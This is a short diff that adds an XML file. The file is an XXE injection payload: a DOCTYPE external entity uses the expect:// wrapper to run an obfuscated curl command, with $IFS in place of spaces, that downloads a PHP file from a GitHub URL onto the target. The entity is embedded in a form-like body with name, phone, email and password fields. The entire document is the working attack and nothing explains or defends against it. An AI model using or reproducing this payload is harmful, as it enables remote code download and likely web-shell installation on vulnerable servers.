@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'https://raw.githubusercontent.com/DOS-cyber/7832735236/main/2.php'">
+]>
+<root>
+  <name>Joe</name>
+  <tel>ufgh</tel>
+  <email>START_&file;_END</email>
+  <password>kjh</password>
+</root>
